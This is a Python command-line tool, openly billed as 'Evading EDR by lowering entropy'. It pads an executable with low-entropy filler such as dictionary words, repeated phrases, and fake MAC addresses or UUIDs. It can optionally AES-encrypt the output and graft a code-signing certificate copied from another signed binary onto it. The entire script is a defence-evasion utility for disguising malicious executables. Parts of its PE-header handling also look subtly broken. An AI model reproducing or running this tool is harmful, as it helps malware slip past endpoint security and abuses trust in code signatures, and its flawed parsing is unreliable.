#!/usr/bin/env python3
import argparse
import struct
import io
import sys
from os import path, stat
from random import choice, getrandbits
import string
from uuid import uuid4
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Utility functions for generating padding
def gen_random_bytes(desired_size):
    return bytes(''.join(choice(string.ascii_uppercase + string.ascii_lowercase)
                         for _ in range(desired_size)), 'ascii')

def build_padding(desired_size, dictionary_file):
    sizeof_dictionary_file = stat(dictionary_file).st_size
    multiplier = int(desired_size / sizeof_dictionary_file)

    with open(dictionary_file, 'rb') as dictionary:
        words = dictionary.read()

    multiplied_words = words * int(multiplier + 1)
    final_words = multiplied_words[:desired_size]

    return final_words

# Low-entropy padding functions
def encode_data_with_repetitive_pattern(desired_size, phrase="Lorem ipsum dolor sit amet"):
    repeated_phrase = (phrase * (desired_size // len(phrase)))[:desired_size]
    return repeated_phrase.encode()

def encode_data_with_character_sequence(desired_size):
    sequence = ''.join(string.ascii_letters[i % len(string.ascii_letters)] for i in range(desired_size))
    return sequence.encode()

def encode_data_with_compression_like_pattern(desired_size, pattern="abcabcabc"):
    repeated_pattern = (pattern * (desired_size // len(pattern)))[:desired_size]
    return repeated_pattern.encode()

def encode_data_with_dynamic_sentence(desired_size):
    subjects = ["The cat", "A dog", "The system", "An agent"]
    verbs = ["runs", "jumps", "logs", "transfers"]
    objects = ["quickly", "securely", "stealthily", "carefully"]
    encoded_data = bytearray()

    while len(encoded_data) < desired_size:
        sentence = f"{choice(subjects)} {choice(verbs)} {choice(objects)}. "
        if len(encoded_data) + len(sentence) <= desired_size:
            encoded_data.extend(sentence.encode())
        else:
            break

    return bytes(encoded_data[:desired_size])

# Additional padding functions for MAC address and UUID
def encode_data_with_mac_pattern(desired_size):
    encoded_data = bytearray()
    while len(encoded_data) < desired_size:
        mac_pattern = "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
            getrandbits(8), getrandbits(8), getrandbits(8), getrandbits(8), getrandbits(8), getrandbits(8)
        ).encode()
        if len(encoded_data) + len(mac_pattern) <= desired_size:
            encoded_data.extend(mac_pattern)
        else:
            break
    return bytes(encoded_data[:desired_size])

def encode_data_with_uuid_pattern(desired_size):
    encoded_data = bytearray()
    while len(encoded_data) < desired_size:
        uuid_pattern = str(uuid4()).encode()
        if len(encoded_data) + len(uuid_pattern) <= desired_size:
            encoded_data.extend(uuid_pattern)
        else:
            break
    return bytes(encoded_data[:desired_size])

# AES encryption
def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    return iv + encrypted_data

# File size utility
def get_file_size(my_file):
    return stat(my_file).st_size

# Signature handling functions
def gather_file_info_win(binary):
    flItms = {}
    binary = open(binary, 'rb')
    binary.seek(int('3C', 16))
    flItms['pe_header_location'] = struct.unpack('<i', binary.read(4))[0]
    flItms['COFF_Start'] = flItms['pe_header_location'] + 4
    binary.seek(flItms['COFF_Start'])
    flItms['OptionalHeader_start'] = flItms['COFF_Start'] + 20

    binary.seek(flItms['OptionalHeader_start'])
    flItms['CertTableLOC'] = binary.tell()
    flItms['CertLOC'] = struct.unpack("<I", binary.read(4))[0]
    flItms['CertSize'] = struct.unpack("<I", binary.read(4))[0]
    binary.close()
    return flItms

def copy_cert(exe):
    flItms = gather_file_info_win(exe)
    with open(exe, 'rb') as f:
        f.seek(flItms['CertLOC'], 0)
        cert = f.read(flItms['CertSize'])
    return cert

def write_cert(cert, exe, output_file):
    flItms = gather_file_info_win(exe)
    with open(output_file, 'ab') as f:
        f.seek(0)
        f.seek(flItms['CertTableLOC'], 0)
        f.write(struct.pack("<I", len(open(exe, 'rb').read())))
        f.write(struct.pack("<I", len(cert)))
        f.seek(0, io.SEEK_END)
        f.write(cert)

def check_sig(exe):
    flItms = gather_file_info_win(exe)
    return flItms['CertLOC'] != 0 and flItms['CertSize'] != 0

# Main padding processing function
def process_padding(input_file, output_file, desired_size, padding_type, dictionary_file=None, aes_key=None, verbose=True):
    with open(input_file, 'rb') as infile:
        original_data = infile.read()
    input_file_len = len(original_data)

    padding_size = desired_size - input_file_len
    if padding_size <= 0:
        print("The input file size is already larger than or equal to the desired size.")
        return

    if verbose:
        print(f"Original file size: {input_file_len} bytes.")
        print(f"Desired file size: {desired_size} bytes. Padding needed: {padding_size} bytes.")
        print(f"Using padding type: {padding_type}")

    if padding_type == 'random':
        padded_data = gen_random_bytes(padding_size)
    elif padding_type == 'dictionary':
        padded_data = build_padding(padding_size, dictionary_file)
    elif padding_type == 'repetitive_pattern':
        padded_data = encode_data_with_repetitive_pattern(padding_size)
    elif padding_type == 'character_sequence':
        padded_data = encode_data_with_character_sequence(padding_size)
    elif padding_type == 'compression_like':
        padded_data = encode_data_with_compression_like_pattern(padding_size)
    elif padding_type == 'dynamic_sentence':
        padded_data = encode_data_with_dynamic_sentence(padding_size)
    elif padding_type == 'mac_address':
        padded_data = encode_data_with_mac_pattern(padding_size)
    elif padding_type == 'uuid':
        padded_data = encode_data_with_uuid_pattern(padding_size)
    else:
        raise ValueError("Invalid padding type specified")

    final_data = original_data + padded_data

    if aes_key:
        if len(aes_key) != 16:
            raise ValueError("AES key must be 16 bytes (128-bit)")
        final_data = aes_encrypt(final_data, aes_key.encode())
        if verbose:
            print("AES encryption applied.")

    with open(output_file, 'wb') as outfile:
        outfile.write(final_data)

    if verbose:
        print(f"New file size: {get_file_size(output_file)} bytes.")
        print(f"Output written to: {output_file}")

def main():
    banner = """


 _______ _ _       _______                     
(_______|_) |     (_______)                    
 _____   _| | ____ _____ ___   ____ ____  ____ 
|  ___) | | |/ _  )  ___) _ \ / ___) _  |/ _  )
| |     | | ( (/ /| |  | |_| | |  ( ( | ( (/ / 
|_|     |_|_|\____)_|   \___/|_|   \_|| |\____)
                                  (_____|      

        Evading EDR by lowering entropy	       
                by timmytrill
"""
    parser = argparse.ArgumentParser(description='Inflate an executable with padding options and optional AES encryption')
    parser.add_argument('-i', '--input', type=str, required=True, help="Input file to increase size")
    parser.add_argument('-m', default=100, type=int, metavar='100', help='Specify the desired size in megabytes to increase by')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet output. Don\'t print the banner')
    parser.add_argument('-s', '--source', help='Source file to copy signature from')

    # Padding and dictionary options
    parser.add_argument('--padding', choices=["random", "dictionary", "repetitive_pattern", "character_sequence", "compression_like", "dynamic_sentence", "mac_address", "uuid"], required=True, help='Padding method')
    parser.add_argument('--dict', help='Dictionary file for dictionary padding (required if padding type is "dictionary")')

    parser.add_argument('--aes', action='store_true', help="Enable AES encryption")
    parser.add_argument('--key', help="16-byte key for AES encryption")

    if len(sys.argv) == 1:
        print(banner)
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    if not args.quiet:
        print(banner)

    if not path.isfile(args.input):
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")
    if args.padding == "dictionary" and not args.dict:
        parser.error("Dictionary padding requires a dictionary file specified with --dict.")

    final_size_bytes = args.m * 1048576
    output_filename = path.splitext(args.input)[0] + '_inflated' + path.splitext(args.input)[1]

    # Run the padding process with detailed output
    process_padding(args.input, output_filename, final_size_bytes, args.padding, args.dict, args.key if args.aes else None, verbose=not args.quiet)

    if args.source and check_sig(args.source):
        cert = copy_cert(args.source)
        write_cert(cert, args.source, output_filename)
        if not args.quiet:
            print(f"Signature copied from {args.source} to {output_filename}.")
    elif args.source:
        print(f"The source file {args.source} does not have a valid signature to copy.")

if __name__ == '__main__':
    main()
